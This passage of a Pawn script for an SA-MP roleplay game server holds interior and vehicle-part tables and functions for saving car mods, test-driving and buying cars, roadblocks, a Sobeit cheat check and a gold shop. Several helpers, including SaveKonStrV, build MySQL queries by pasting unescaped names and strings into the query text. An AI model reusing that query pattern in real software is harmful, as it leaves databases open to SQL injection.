            {316.5,-167.63,999.59,10.3},{-285.25,1471.2,1084.38,85.65},{-26.83,-55.58,1003.55,3.95},{442.13,-52.48,999.72,177.94},{2182.2,1628.58,1043.87,224.86},{748.46,1438.24,1102.95,0.61},
            {2807.36,-1171.7,1025.57,193.71},{366.0,-9.43,1001.85,160.53},{2216.13,-1076.31,1050.48,86.43},{2268.52,1647.77,1084.23,99.73},{2236.7,-1078.95,1049.02,2.57},
            {-2031.12,-115.83,1035.17,190.19},{2365.11,-1133.08,1050.88,177.39},{1168.51,1360.11,10.93,196.59},{315.45,976.6,1960.85,359.64},{1893.07,1017.9,31.88,86.1},
            {501.96,-70.56,998.76,171.57},{-42.53,1408.23,1084.43,172.07},{2283.31,1139.31,1050.9,19.7},{84.92,1324.3,1083.86,159.56},{260.74,1238.23,1084.26,84.31},
            {-1658.17,1215.0,7.25,103.91},{-1961.63,295.24,35.47,264.49}
       },
       IntArray2[146][1] =
       {
            {11},{5},{3},{3},{3},{3},{3},{18},{1},{3},{2},{3},{3},{3},{3},{3},{3},{3},{3},{17},{17},{5},{5},{17},{7},{5},
            {2},{10},{10},{7},{1},{1},{1},{1},{1},{3},{5},{1},{1},{7},{2},{10},{1},{2},{1},{10},{3},{10},{1},{2},{2},{2},
            {18},{18},{3},{5},{2},{5},{1},{10},{14},{14},{12},{14},{17},{18},{16},{5},{6},{9},{10},{17},{16},{15},{1},{1},
            {3},{2},{1},{5},{15},{15},{15},{12},{0},{0},{0},{18},{0},{0},{0},{0},{2},{5},{5},{4},{4},{4},{4},{0},{4},{10},
            {1},{0},{0},{4},{12},{6},{12},{4},{6},{6},{14},{4},{5},{5},{3},{14},{16},{6},{6},{6},{6},{6},{15},{6},{6},{2},
            {6},{8},{9},{1},{1},{2},{3},{8},{0},{9},{10},{11},{8},{11},{9},{9},{0},{0}
       },
       IntName[146][] =
       {
            "Four Dragons Managerial Suite",
            "Ganton Gym",
            "Brothel",
            "Brothel2",
            "Inside Track Betting",
            "Blastin  Fools Records",
            "The Big Spread Ranch",
            "Warehouse1 ",
            "Warehouse2 ",
            "B Dup s Apartment",
            "B Dup s Crack Palace",
            "Wheel Arch Angels",
            "OG Loc s House",
            "Barber Shop",
            "Planning Department",
            "Las Venturas Police Department",
            "Pro-Laps",
            "Sex Shop",
            "Las Venturas Tattoo parlor",
            "Lost San Fierro Tattoo",
            "24/07/09 (version 1)",
            "Diner1 ",
            "Pizza Stack",
            "Rusty Brown s Donuts",
            "Ammu-nation",
            "Victim",
            "Loco Low Co",
            "San Fierro Police Department",
            "24/07/09 (version 2)",
            "Below The Belt Gym",
            "Transfenders",
            "World of Coq",
            "Ammu-nation (version 2)",
            "SubUrban",
            "Denise s Bedroom",
            "Helena s Barn",
            "Barbara s Love nest",
            "San Fierro Garage",
            "Oval Stadium",
            "8-Track Stadium",
            "The Pig Pen (strip",
            "Four Dragons",
            "Liberty City",
            "Ryder s house",
            "Sweet s House",
            "RC Battlefield",
            "The Johnson House",
            "Burger shot",
            "Caligula s Casino",
            "Katie s Lovenest",
            "Barber Shop2 (Reece s)",
            "Angel Pine Trailer",
            "24/07/09 (version 3)",
            "Zip",
            "The Pleasure Domes",
            "Madd Dogg s Mansion",
            "Big Smoke s Crack Palace",
            "Burning Desire Building",
            "Wu-Zi Mu s",
            "Abandoned AC tower",
            "Wardrobe/Changing room",
            "Didier Sachs",
            "Casino (Redsands West)",
            "Kickstart Stadium",
            "Club",
            "Atrium",
            "Los Santos Tattoo Parlor",
            "Safe House group1 ",
            "Safe House group2 ",
            "Safe House group3 ",
            "Safe House group4 ",
            "Sherman Dam",
            "24/07/09 (version 4)",
            "Jefferson Motel",
            "Jet Interior",
            "The Welcome Pump",
            "Burglary House X1",
            "Burglary House X2",
            "Burglary House X3",
            "Burglary House X4",
            "Binco",
            "4 Burglary houses",
            "Blood Bowl Stadium",
            "Budget Inn Motel Room",
            "Palamino Bank",
            "Palamino Diner",
            "Dillimore Gas Station",
            "Lil  Probe Inn",
            "Torreno s Ranch",
            "Zombotech - lobby area",
            "Crypt in LS cemetery",
            "Blueberry Liquor Store",
            "Pair of Burglary Houses",
            "Crack Den",
            "Burglary House X11",
            "Burglary House X12",
            "Ammu-nation (version 3)",
            "Jay s Diner",
            "24/07/09 (version 5)",
            "Warehouse3 ",
            "Michelle s Love Nest*",
            "Burglary House X14",
            "Sindacco Abatoir",
            "K.A.C.C. Military Fuels Depot",
            "Area69 ",
            "Burglary House X13",
            "Unused Safe House",
            "Millie s Bedroom",
            "Barber Shop",
            "Dirtbike Stadium",
            "Cobra Gym",
            "Los Santos Police Department",
            "Los Santos Airport",
            "Burglary House X15",
            "Burglary House X16",
            "Burglary House X17",
            "Bike School",
            "Francis International Airport",
            "Vice Stadium",
            "Burglary House X18",
            "Burglary House X19",
            "Zero s RC Shop",
            "Ammu-nation (version 4)",
            "Ammu-nation (version 5)",
            "Burglary House X20",
            "24/07/09 (version 6)",
            "Secret Valley Diner",
            "Rosenberg s Office in Caligulas",
            "Fanny Batter s Whore House",//
            "Colonel Furhberger s",
            "Cluckin  Bell",
            "The Camel s Toe Safehouse",
            "Caligula s Roof",
            "Old Venturas Strip Casino",
            "Driving School",
            "Verdant Bluffs Safehouse",
            "Bike School",
            "Andromada",
            "Four Dragons  Janitor s Office",
            "Bar",
            "Burglary House X21",
            "Willowfield Safehouse",
            "Burglary House X22",
            "Burglary House X23",
            "Otto s Autos",
            "Wang Cars"
       },
       spoiler[20][0] =
       {
            {1000},
            {1001},
            {1002},
            {1003},
            {1014},
            {1015},
            {1016},
            {1023},
            {1058},
            {1060},
            {1049},
            {1050},
            {1138},
            {1139},
            {1146},
            {1147},
            {1158},
            {1162},
            {1163},
            {1164}
       },
       fbumper[23][0] =
       {
            {1117},
            {1152},
            {1153},
            {1155},
            {1157},
            {1160},
            {1165},
            {1167},
            {1169},
            {1170},
            {1171},
            {1172},
            {1173},
            {1174},
            {1175},
            {1179},
            {1181},
            {1182},
            {1185},
            {1188},
            {1189},
            {1192},
            {1193}
       },
       rbumper[22][0] =
       {
            {1140},
            {1141},
            {1148},
            {1149},
            {1150},
            {1151},
            {1154},
            {1156},
            {1159},
            {1161},
            {1166},
            {1168},
            {1176},
            {1177},
            {1178},
            {1180},
            {1183},
            {1184},
            {1186},
            {1187},
            {1190},
            {1191}
       },
       exhaust[28][0] =
       {
            {1018},
            {1019},
            {1020},
            {1021},
            {1022},
            {1028},
            {1029},
            {1037},
            {1043},
            {1044},
            {1045},
            {1046},
            {1059},
            {1064},
            {1065},
            {1066},
            {1089},
            {1092},
            {1104},
            {1105},
            {1113},
            {1114},
            {1126},
            {1127},
            {1129},
            {1132},
            {1135},
            {1136}
       },
       bventr[2][0] =
       {
            {1142},
            {1144}
        },
       bventl[2][0] =
       {
            {1143},
            {1145}
       },

       bscoop[4][0] =
       {
            {1004},
            {1005},
            {1011},
            {1012}
       },
       rscoop[17][0] =
       {
            {1006},
            {1032},
            {1033},
            {1035},
            {1038},
            {1053},
            {1054},
            {1055},
            {1061},
            {1067},
            {1068},
            {1088},
            {1091},
            {1103},
            {1128},
            {1130},
            {1131}
       },
       lskirt[21][0] =
       {
            {1007},
            {1026},
            {1031},
            {1036},
            {1039},
            {1042},
            {1047},
            {1048},
            {1056},
            {1057},
            {1069},
            {1070},
            {1090},
            {1093},
            {1106},
            {1108},
            {1118},
            {1119},
            {1133},
            {1122},
            {1134}
       },
       rskirt[21][0] =
       {
            {1017},
            {1027},
            {1030},
            {1040},
            {1041},
            {1051},
            {1052},
            {1062},
            {1063},
            {1071},
            {1072},
            {1094},
            {1095},
            {1099},
            {1101},
            {1102},
            {1107},
            {1120},
            {1121},
            {1124},
            {1137}
       },
       hydraulics[1][0] =
       {
            {1087}
       },
       base[1][0] =
       {
            {1086}
       },
       rbbars[4][0] =
       {
            {1109},
            {1110},
            {1123},
            {1125}
       },
       fbbars[2][0] =
       {
            {1115},
            {1116}
       },
       wheels[17][0] =
       {
            {1025},
            {1073},
            {1074},
            {1075},
            {1076},
            {1077},
            {1078},
            {1079},
            {1080},
            {1081},
            {1082},
            {1083},
            {1084},
            {1085},
            {1096},
            {1097},
            {1098}
       },
       lightss[2][0] =
       {
            {1013},
            {1024}
       };
/*----------------------------------------------------------------------------*/
public Float:GetDistanceBetweenPlayers(p1,p2)
{
    new Float:x1,Float:y1,Float:z1,Float:x2,Float:y2,Float:z2;
    if(!IsPlayerConnected(p1) || !IsPlayerConnected(p2))
    {
        return -1.00;
    }
    GetPlayerPos(p1,x1,y1,z1);
    GetPlayerPos(p2,x2,y2,z2);
    return floatsqroot(floatpower(floatabs(floatsub(x2,x1)),2)+floatpower(floatabs(floatsub(y2,y1)),2)+floatpower(floatabs(floatsub(z2,z1)),2));
}
/*----------------------------------------------------------------------------*/
public SaveComponent(vehicleid,componentid)
{
    if(OwnedMashin[vehicleid] == 1 && IsPlayerConnected(MashinOwner[vehicleid]))
    {
        for(new s=0; s<20; s++)
        {
            if(componentid == spoiler[s][0])
            {
                PlayerInfo[MashinOwner[vehicleid]][cMod1] = componentid;
                SaveKonVal(MashinOwner[vehicleid], "cMod1", componentid);
            }
        }
        for(new s=0; s<23; s++)
        {
            if(componentid == fbumper[s][0])
            {
                PlayerInfo[MashinOwner[vehicleid]][cMod3] = componentid;
                SaveKonVal(MashinOwner[vehicleid], "cMod3", componentid);
            }
        }
        for(new s=0; s<22; s++)
        {
            if(componentid == rbumper[s][0])
            {
                PlayerInfo[MashinOwner[vehicleid]][cMod4] = componentid;
                SaveKonVal(MashinOwner[vehicleid], "cMod4", componentid);
            }
        }
        for(new s=0; s<28; s++)
        {
            if(componentid == exhaust[s][0])
            {
                PlayerInfo[MashinOwner[vehicleid]][cMod5] = componentid;
                SaveKonVal(MashinOwner[vehicleid], "cMod5", componentid);
            }
        }
        for(new s=0; s<2; s++)
        {
            if(componentid == bventr[s][0])
            {
                PlayerInfo[MashinOwner[vehicleid]][cMod6] = componentid;
                SaveKonVal(MashinOwner[vehicleid], "cMod6", componentid);
            }
        }
        for(new s=0; s<2; s++)
        {
            if(componentid == bventl[s][0])
            {
                PlayerInfo[MashinOwner[vehicleid]][cMod7] = componentid;
                SaveKonVal(MashinOwner[vehicleid], "cMod7", componentid);
            }
        }
        for(new s=0; s<4; s++)
        {
            if(componentid == bscoop[s][0])
            {
                PlayerInfo[MashinOwner[vehicleid]][cMod8] = componentid;
                SaveKonVal(MashinOwner[vehicleid], "cMod8", componentid);
            }
        }
        for(new s=0; s<17; s++)
        {
            if(componentid == rscoop[s][0])
            {
                PlayerInfo[MashinOwner[vehicleid]][cMod9] = componentid;
                SaveKonVal(MashinOwner[vehicleid], "cMod9", componentid);
            }
        }
        for(new s=0; s<21; s++)
        {
            if(componentid == lskirt[s][0])
            {
                PlayerInfo[MashinOwner[vehicleid]][cMod10] = componentid;
                SaveKonVal(MashinOwner[vehicleid], "cMod10", componentid);
            }
        }
        for(new s=0; s<21; s++)
        {
            if(componentid == rskirt[s][0])
            {
                PlayerInfo[MashinOwner[vehicleid]][cMod11] = componentid;
                SaveKonVal(MashinOwner[vehicleid], "cMod11", componentid);
            }
        }
        for(new s=0; s<1; s++)
        {
            if(componentid == hydraulics[s][0])
            {
                PlayerInfo[MashinOwner[vehicleid]][cMod12] = componentid;
                SaveKonVal(MashinOwner[vehicleid], "cMod12", componentid);
            }
        }
        for(new s=0; s<1; s++)
        {
            if(componentid == base[s][0])
            {
                PlayerInfo[MashinOwner[vehicleid]][cMod13] = componentid;
                SaveKonVal(MashinOwner[vehicleid], "cMod13", componentid);
            }
        }
        for(new s=0; s<4; s++)
        {
            if(componentid == rbbars[s][0])
            {
                PlayerInfo[MashinOwner[vehicleid]][cMod14] = componentid;
                SaveKonVal(MashinOwner[vehicleid], "cMod14", componentid);
            }
        }
        for(new s=0; s<2; s++)
        {
            if(componentid == fbbars[s][0])
            {
                PlayerInfo[MashinOwner[vehicleid]][cMod15] = componentid;
                SaveKonVal(MashinOwner[vehicleid], "cMod15", componentid);
            }
        }
        for(new s=0; s<17; s++)
        {
            if(componentid == wheels[s][0])
            {
                PlayerInfo[MashinOwner[vehicleid]][cMod16] = componentid;
                SaveKonVal(MashinOwner[vehicleid], "cMod16", componentid);
            }
        }
        for(new s=0; s<2; s++)
        {
            if(componentid == lightss[s][0])
            {
                PlayerInfo[MashinOwner[vehicleid]][cMod17] = componentid;
                SaveKonVal(MashinOwner[vehicleid], "cMod17", componentid);
            }
        }
        //SaveAccount(MashinOwner[vehicleid]);
    }
    if(OwnedMashin_2[vehicleid] == 1 && IsPlayerConnected(MashinOwner_2[vehicleid]))
    {
        for(new s=0; s<20; s++)
        {
            if(componentid == spoiler[s][0])
            {
                PlayerInfo[MashinOwner_2[vehicleid]][cMod1_2] = componentid;
                SaveKonVal(MashinOwner_2[vehicleid], "cMod1_2", componentid);
            }
        }
        for(new s=0; s<23; s++)
        {
            if(componentid == fbumper[s][0])
            {
                PlayerInfo[MashinOwner_2[vehicleid]][cMod3_2] = componentid;
                SaveKonVal(MashinOwner_2[vehicleid], "cMod3_2", componentid);
            }
        }
        for(new s=0; s<22; s++)
        {
            if(componentid == rbumper[s][0])
            {
                PlayerInfo[MashinOwner_2[vehicleid]][cMod4_2] = componentid;
                SaveKonVal(MashinOwner_2[vehicleid], "cMod4_2", componentid);
            }
        }
        for(new s=0; s<28; s++)
        {
            if(componentid == exhaust[s][0])
            {
                PlayerInfo[MashinOwner_2[vehicleid]][cMod5_2] = componentid;
                SaveKonVal(MashinOwner_2[vehicleid], "cMod5_2", componentid);
            }
        }
        for(new s=0; s<2; s++)
        {
            if(componentid == bventr[s][0])
            {
                PlayerInfo[MashinOwner_2[vehicleid]][cMod6_2] = componentid;
                SaveKonVal(MashinOwner_2[vehicleid], "cMod6_2", componentid);
            }
        }
        for(new s=0; s<2; s++)
        {
            if(componentid == bventl[s][0])
            {
                PlayerInfo[MashinOwner_2[vehicleid]][cMod7_2] = componentid;
                SaveKonVal(MashinOwner_2[vehicleid], "cMod7_2", componentid);
            }
        }
        for(new s=0; s<4; s++)
        {
            if(componentid == bscoop[s][0])
            {
                PlayerInfo[MashinOwner_2[vehicleid]][cMod8_2] = componentid;
                SaveKonVal(MashinOwner_2[vehicleid], "cMod8_2", componentid);
            }
        }
        for(new s=0; s<17; s++)
        {
            if(componentid == rscoop[s][0])
            {
                PlayerInfo[MashinOwner_2[vehicleid]][cMod9_2] = componentid;
                SaveKonVal(MashinOwner_2[vehicleid], "cMod9_2", componentid);
            }
        }
        for(new s=0; s<21; s++)
        {
            if(componentid == lskirt[s][0])
            {
                PlayerInfo[MashinOwner_2[vehicleid]][cMod10_2] = componentid;
                SaveKonVal(MashinOwner_2[vehicleid], "cMod10_2", componentid);
            }
        }
        for(new s=0; s<21; s++)
        {
            if(componentid == rskirt[s][0])
            {
                PlayerInfo[MashinOwner_2[vehicleid]][cMod11_2] = componentid;
                SaveKonVal(MashinOwner_2[vehicleid], "cMod11_2", componentid);
            }
        }
        for(new s=0; s<1; s++)
        {
            if(componentid == hydraulics[s][0])
            {
                PlayerInfo[MashinOwner_2[vehicleid]][cMod12_2] = componentid;
                SaveKonVal(MashinOwner_2[vehicleid], "cMod12_2", componentid);
            }
        }
        for(new s=0; s<1; s++)
        {
            if(componentid == base[s][0])
            {
                PlayerInfo[MashinOwner_2[vehicleid]][cMod13_2] = componentid;
                SaveKonVal(MashinOwner_2[vehicleid], "cMod13_2", componentid);
            }
        }
        for(new s=0; s<4; s++)
        {
            if(componentid == rbbars[s][0])
            {
                PlayerInfo[MashinOwner_2[vehicleid]][cMod14_2] = componentid;
                SaveKonVal(MashinOwner_2[vehicleid], "cMod14_2", componentid);
            }
        }
        for(new s=0; s<2; s++)
        {
            if(componentid == fbbars[s][0])
            {
                PlayerInfo[MashinOwner_2[vehicleid]][cMod15_2] = componentid;
                SaveKonVal(MashinOwner_2[vehicleid], "cMod15_2", componentid);
            }
        }
        for(new s=0; s<17; s++)
        {
            if(componentid == wheels[s][0])
            {
                PlayerInfo[MashinOwner_2[vehicleid]][cMod16_2] = componentid;
                SaveKonVal(MashinOwner_2[vehicleid], "cMod16_2", componentid);
            }
        }
        for(new s=0; s<2; s++)
        {
            if(componentid == lightss[s][0])
            {
                PlayerInfo[MashinOwner_2[vehicleid]][cMod17_2] = componentid;
                SaveKonVal(MashinOwner_2[vehicleid], "cMod17_2", componentid);
            }
        }
        //SaveAccount(MashinOwner[vehicleid]);
    }
    return 1;
}

forward OnTestMashin(playerid);
public OnTestMashin(playerid) {

DestroyVehicle(vhid[playerid]);

SCM(playerid, COLOR_YELLOW, "Time Test Mashin Tamam Shod.");
SetPlayerPos(playerid,-1953.721801,264.140136,41.047080);

okkon(playerid,rV[playerid]);
TextDrawShowForPlayer(playerid, TestModel[playerid]);
TextDrawShowForPlayer(playerid, BuyModel[playerid]);
TextDrawShowForPlayer(playerid, NextModel[playerid]);
TextDrawShowForPlayer(playerid, PrevModel[playerid]);
TextDrawShowForPlayer(playerid, ExitDS[playerid]);
TextDrawShowForPlayer(playerid, RotModel[playerid]);
TextDrawShowForPlayer(playerid, RotModel2[playerid]);
PlayerTextDrawShow(playerid, CarModel[playerid]);
PlayerTextDrawShow(playerid, PriceModel[playerid]);

OnMashinKharidan[playerid] = 1;
SelectTextDraw(playerid, 0x00FF00FF);
OnTestMashine[playerid] = 0;

}
forward OnTestMashinOk(playerid);
public OnTestMashinOk(playerid) {
OnTestMashine[playerid] = 1;
}

stock CreateRoadblock(Object,Float:x,Float:y,Float:z,Float:Angle)
{
    for(new i = 0; i < sizeof(Roadblocks); i++)
    {
    	if(Roadblocks[i][sCreated] == 0)
     	{
            Roadblocks[i][sCreated] = 1;
            Roadblocks[i][sX] = x;
            Roadblocks[i][sY] = y;
            Roadblocks[i][sZ] = z-0.7;
            Roadblocks[i][sObject] = CreateObject(Object, x, y, z-0.9, 0, 0, Angle);
            return 1;
		}
	}
	return 0;
}
stock DeleteAllRoadblocks(playerid)
{
    for(new i = 0; i < sizeof(Roadblocks); i++)
    {
    	if(IsPlayerInRangeOfPoint(playerid, 100, Roadblocks[i][sX], Roadblocks[i][sY], Roadblocks[i][sZ]))
        {
        	if(Roadblocks[i][sCreated] == 1)
         	{
          		Roadblocks[i][sCreated] = 0;
            	Roadblocks[i][sX] = 0.0;
             	Roadblocks[i][sY] = 0.0;
              	Roadblocks[i][sZ] = 0.0;
               	DestroyObject(Roadblocks[i][sObject]);
        	}
    	}
	}
    return 0;
}
stock GetIDVeh(playerid/*,mod,car,VehModKharid*/)
{
    mysql_function_query(handle, "SELECT * FROM `vehicles`",true,"OnPlayerGetIDVeh","iiii",playerid/*,mod,car,VehModKharid*/);
}

Public:OnPlayerGetIDVeh(playerid,mod,car/*,VehModKharid*/)
{



				new query[512];
				format(query, 512, "INSERT INTO `vehicles` (`cModel`)VALUES ('%d')",car);
				mysql_tquery(handle, query, "SendQuery", "");

				mysql_tquery(handle, "ALTER TABLE `vehicles` ORDER BY `vID`", "SendQuery", "");

//				new rows = cache_get_row_count ();
			//	new insert = rows;


				SCM(playerid,COLOR_AMIR,"I give you a Checkpoint to you know where is it.");

				DestroyVehicle(vhid[playerid]);
				TextDrawHideForPlayer(playerid, TestModel[playerid]);
				TextDrawHideForPlayer(playerid, BuyModel[playerid]);
				TextDrawHideForPlayer(playerid, NextModel[playerid]);
				TextDrawHideForPlayer(playerid, PrevModel[playerid]);
				TextDrawHideForPlayer(playerid, ExitDS[playerid]);
				TextDrawHideForPlayer(playerid, RotModel[playerid]);
				TextDrawHideForPlayer(playerid, RotModel2[playerid]);
				PlayerTextDrawHide(playerid, CarModel[playerid]);
				PlayerTextDrawHide(playerid, PriceModel[playerid]);
				OnMashinKharidan[playerid] = 0;
				SetPlayerPos(playerid, 325.5731,-1514.8918,36.0325);
				CancelSelectTextDraw(playerid);
				SetCameraBehindPlayer(playerid);

				SetPlayerVirtualWorld(playerid, 0);


}

public OnVehicleRespray(playerid, vehicleid, color1, color2)
{
	vHealth[vehicleid] =1000.0;
    return 1;
}
public OnVehiclePaintjob(playerid, vehicleid, paintjobid)
{
	vHealth[vehicleid] =1000.0;
    if(OwnedMashin[vehicleid] == 1)
    {
        PlayerInfo[MashinOwner[vehicleid]][cPaintJob] = paintjobid;
        SaveKonVal(MashinOwner[vehicleid], "cPaintJob", paintjobid);
        //SaveAccount(MashinOwner[vehicleid]);
    }
    else if(OwnedMashin_2[vehicleid] == 1)
    {
        PINFO[MashinOwner_2[vehicleid]][cPaintJob_2] = paintjobid;
        SaveKonVal(MashinOwner_2[vehicleid], "cPaintJob_2", paintjobid);
        //SaveAccount(MashinOwner_2[vehicleid]);
    }
    return 1;
}

stock SaveKonStrV(vid, name[], str[])
{
        new query[500];
        format(query, 500, "UPDATE `vehicles` SET %s='%s' WHERE vID='%d'", name, str, vid);
        mysql_tquery(handle, query, "SendQuery", "");
//		new file[128];
    return 1;
}

stock ReturnVehicle(playerid, veh)
{
	mysql_tquery(handle, "ALTER TABLE `vehicles` ORDER BY `vID`", "SendQuery", "");
    new query[512];
    format(query, sizeof(query), "SELECT * FROM `vehicles` WHERE `vID`='%d'", veh);
    mysql_function_query(handle, query, true, "OnReturnVehicle", "dd", playerid, veh);
}

stock SaveKonValV(vid, name[], value)
{
        new query[500];
        format(query, 500, "UPDATE `vehicles` SET %s='%d' WHERE vID='%d'", name, value, vid);
        mysql_tquery(handle, query, "SendQuery", "");
//		new file[128];
    return 1;
}

stock SaveKonFloatV(vid, name[], Float:value)
{
    new query[450];
    format(query, 450, "UPDATE `vehicles` SET %s='%f' WHERE vID='%d'", name, value, vid);
    mysql_tquery(handle, query, "SendQuery", "");
//	new file[128];
    return 1;
}

stock GetVehicleColorX(vehicleID, &color1, &color2)
{
        vehicleID = PROPERTY_OFFSET(vehicleID);

        if(existproperty(_, "", vehicleID))
        {
                new
                        colorStr[24],
                        strPos
                ;
                getproperty(_, "", vehicleID, colorStr);
                strunpack(colorStr, colorStr);

                if((strPos = strfind(colorStr, "-")) != -1)
                {
                        color1 = strval(colorStr);
                        color2 = strval(colorStr[strPos + 1]);
                        return 1;
                }
        }
        return 0;
}

stock IsPlayerInWater2(playerid)
{
new Float:x,Float:y,Float:pz;
GetPlayerPos(playerid,x,y,pz);
if ((IsPlayerInArea(playerid, 2032.1371, 1841.2656, 1703.1653, 1467.1099) && pz <= 9.0484)
|| (IsPlayerInArea(playerid, 2109.0725, 2065.8232, 1962.5355, 10.8547) && pz <= 10.0792)
|| (IsPlayerInArea(playerid, -492.5810, -1424.7122, 2836.8284, 2001.8235) && pz <= 41.06)
|| (IsPlayerInArea(playerid, -2675.1492, -2762.1792, -413.3973, -514.3894) && pz <= 4.24)
|| (IsPlayerInArea(playerid, -453.9256, -825.7167, -1869.9600, -2072.8215) && pz <= 5.72)
|| (IsPlayerInArea(playerid, 1281.0251, 1202.2368, -2346.7451, -2414.4492) && pz <= 9.3145)
|| (IsPlayerInArea(playerid, 2012.6154, 1928.9028, -1178.6207, -1221.4043) && pz <= 18.45)
|| (IsPlayerInArea(playerid, 2326.4858, 2295.7471, -1400.2797, -1431.1266) && pz <= 22.615)
|| (IsPlayerInArea(playerid, 2550.0454, 2513.7588, 1583.3751, 1553.0753) && pz <= 9.4171)
|| (IsPlayerInArea(playerid, 1102.3634, 1087.3705, -663.1653, -682.5446) && pz <= 112.45)
|| (IsPlayerInArea(playerid, 1287.7906, 1270.4369, -801.3882, -810.0527) && pz <= 87.123)
|| (pz < 1.5)
)
{
return 1;
}
return 0;
}
stock IsPlayerInWater3( playerid )
{
        new Float[ 3 ];

        GetPlayerPos( playerid, Float[ 0 ], Float[ 1 ], Float[ 2 ] );
        if(
        (IsPlayerInArea(playerid, 2032.1371, 1841.2656, 1703.1653, 1467.1099) && Float[ 2 ] <= 9.0484) //lv piratenschiff
        || (IsPlayerInArea(playerid, 2109.0725, 2065.8232, 1962.5355, 10.8547) && Float[ 2 ] <= 10.0792) //lv visage
        || (IsPlayerInArea(playerid, -492.5810, -1424.7122, 2836.8284, 2001.8235) && Float[ 2 ] <= 41.06) //lv staucamm
        || (IsPlayerInArea(playerid, -2675.1492, -2762.1792, -413.3973, -514.3894) && Float[ 2 ] <= 4.24) //sf s??sten kleiner teich
        || (IsPlayerInArea(playerid, -453.9256, -825.7167, -1869.9600, -2072.8215) && Float[ 2 ] <= 5.72) //sf gammel teich
        || (IsPlayerInArea(playerid, 1281.0251, 1202.2368, -2346.7451, -2414.4492) && Float[ 2 ] <= 9.3145) //ls neben dem airport
        || (IsPlayerInArea(playerid, 2012.6154, 1928.9028, -1178.6207, -1221.4043) && Float[ 2 ] <= 18.45) //ls mitte teich
        || (IsPlayerInArea(playerid, 2326.4858, 2295.7471, -1400.2797, -1431.1266) && Float[ 2 ] <= 22.615) //ls weiter s??tlich
        || (IsPlayerInArea(playerid, 2550.0454, 2513.7588, 1583.3751, 1553.0753) && Float[ 2 ] <= 9.4171) //lv pool ?stlich
        || (IsPlayerInArea(playerid, 1102.3634, 1087.3705, -663.1653, -682.5446) && Float[ 2 ] <= 112.45) //ls pool nordwestlich
        || (IsPlayerInArea(playerid, 1287.7906, 1270.4369, -801.3882, -810.0527) && Float[ 2 ] <= 87.123) //pool bei maddog's haus oben
        || (Float[ 2 ] < 1.5)
        )
        {
                return ( 1 );
        }
        return ( 0 );
}

stock GivePlayerJetpack(playerid)
{
	SetPlayerSpecialAction(playerid,2);
	HaveJetpack[playerid] =1;
}
stock IsPlayerInNeon(vehicleid)
{
    new result;
    new model = GetVehicleModel(vehicleid);
    switch(model)
    {
        case 460,476,511,512,448,461,462,463,468,521,522,523,581,586,471,430,446,452,453,454,472,473,484,493,595,519,520,553,417,425,447,469,487,481,509,510,488,497,548,563,577,592,464,465,501,564,594,593: result = model;
        default: result = 0;
    }
    return result;
}


new Float:xcamera[MAX_PLAYERS];

forward checksobit(playerid);
public checksobit(playerid)
{
 SetPlayerPos(playerid, 1450.7118, -1086.4741, 213.2708);
 SetCameraBehindPlayer(playerid);
 TogglePlayerControllable(playerid,1);
 SetTimerEx("checksobit2", 2000, false, "i", playerid);
}
forward checksobit2(playerid);
public checksobit2(playerid)
{
 new Float:x,Float:y,Float:z;
 GetPlayerCameraFrontVector(playerid, x, y, z);
 xcamera[playerid] = z;
 SetTimerEx("checksobit3", 3000, false, "i", playerid);
}
forward checksobit3(playerid);
public checksobit3(playerid)
{
 new Float:x,Float:y,Float:z;
 GetPlayerCameraFrontVector(playerid, x, y, z);
 if(xcamera[playerid] == z)
 {
 TogglePlayerControllable(playerid,1);
 SpawnPlayer(playerid);
 }
 else
 {
 new stringo[256];
 new cheate[64];
 GetPlayerName(playerid, cheate, sizeof(cheate));
 format(stringo, 256, "AdmWarning : %s have cheats (Sobeit) !", cheate);
 ABroadCast(COLOR_AdminWarn,stringo,1);
 }
}
forward kk3(playerid);
public kk3(playerid)
{
Kick(playerid);
}



stock SellGoldItem(playerid,PackageName[],Golds)
{
    new string[256],File:lFile,Saat, Daghighe, Sanie,Sal,Mah,Rooz;
	if(PINFO[playerid][pGold] < Golds)
	{
		format(string, sizeof(string), "{FFFFFF}Baraie Kharid Package {bdf9f2}%s {FFFFFF}Be Arzesh {dcfdcc}%d Gold\n{FFFFFF}Be {57e547}%d {FFFFFF}Gold Digar Niaz Darid.\n\n\n{B4B5B7}- Baraie Kharid Gold Be Site Morajee Konid.",PackageName,Golds,Golds-PINFO[playerid][pGold]);
		ShowPlayerDialog(playerid,0,DIALOG_STYLE_MSGBOX, "{57e547}Error:",string, "{FFFFFF}Ok","");
		return 1;
	}
	PINFO[playerid][pGold] -=Golds;
	format(string,sizeof(string),"_> %s Package {bdf9f2}%s {cae0ff}Ra Kharidari Kard. {FFFFFF}/Shop",PlayerName(playerid),PackageName);
	SendClientMessageToAll(0xcae0ffFF,string);
	SendClientMessage(playerid,COLOR_GREEN,"Ta 24 Sa'at Ayande Package Be Shoma Dade Mishavad. Ba Tashakor Az Kharid Shoma.");
    gettime(Saat, Daghighe, Sanie);
    getdate(Sal, Mah, Rooz);
    format(string, sizeof(string), "%s - %s\r\n",PlayerName(playerid),PackageName);
    lFile = fopen("SShop.log",io_append);
    fwrite(lFile, string);
    fclose(lFile);
    printf("[%d-%02d-%02d][%02d:%02d:%02d] %s Buy Package",Sal,Mah,Rooz,Saat,Daghighe,Sanie,PlayerName(playerid),PackageName);
    return 1;
}
stock KickAntiCheat(playerid,why[])
{
    new string[128];
	format(string, sizeof(string), "AdmBot: %s Tavasote AdmBot Kick Shod , Dalil: %s",PlayerName(playerid),why);
	SendClientMessageToAll(COLOR_LIGHTRED, string);
	SetTimerEx("KickPublic",500, false, "i", playerid);
    return 1;
}
stock GivePlayerTag(playerid, tag[])
{
  new name[MAX_PLAYER_NAME];
  new newname[30];


  GetPlayerName(playerid ,name ,MAX_PLAYER_NAME);

  format(newname, sizeof(newname), "[%s]%s", tag, PlayerInfo[playerid][pName]);

  SetPlayerName(playerid, newname);

}

stock GetPlayerTag(playerid)
{

  SetPlayerName(playerid, PlayerInfo[playerid][pName]);


}
stock ModVehicle(playerid,vehicleid)
{
    if(OwnedMashin[vehicleid] != 0)
    {
        if(PlayerInfo[playerid][cMod1] != 0) {
            AddVehicleComponent(vehicleid,PlayerInfo[playerid][cMod1]);
        }
        if(PlayerInfo[playerid][cMod3] != 0) {
            AddVehicleComponent(vehicleid,PlayerInfo[playerid][cMod3]);
        }
        if(PlayerInfo[playerid][cMod4] != 0) {
            AddVehicleComponent(vehicleid,PlayerInfo[playerid][cMod4]);
        }
        if(PlayerInfo[playerid][cMod5] != 0) {
